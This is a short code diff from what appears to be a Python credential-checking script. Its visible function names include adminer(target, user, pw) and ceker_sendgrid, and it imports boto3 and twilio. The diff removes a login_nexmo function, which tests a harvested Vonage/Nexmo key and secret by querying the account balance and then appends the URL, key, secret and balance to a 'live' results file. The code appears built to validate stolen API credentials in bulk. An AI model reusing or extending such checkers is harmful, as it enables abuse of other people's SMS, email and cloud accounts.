@@ -20,7 +20,7 @@ except:
     from Queue import Queue
 
 if sys.version_info.major == 3:
-    import vonage
+    
     import boto3
     from twilio.rest import Client
 
@@ -1971,15 +1971,6 @@ def adminer(target, user, pw):
         return False
 
 
-def login_nexmo(f_url, f_key, f_secret):
-    try:
-        f_key = str(f_key)
-        f_secret = str(f_secret)
-        cl = vonage.Client(key=f_key, secret=f_secret)
-        res = cl.get_balance()
-        open('Result/nexmo_live.txt', 'a').write('-' * 30 + '\nURL = {}\nKEY = {}\nSECRET = {}\nVALUE = {}\nautoReload = {}\n'.format(f_url, f_key, f_secret,res['value'], res['autoReload']) + '\n')
-    except:
-        pass
 
 def ceker_sendgrid(f_url,f_key):
     try:
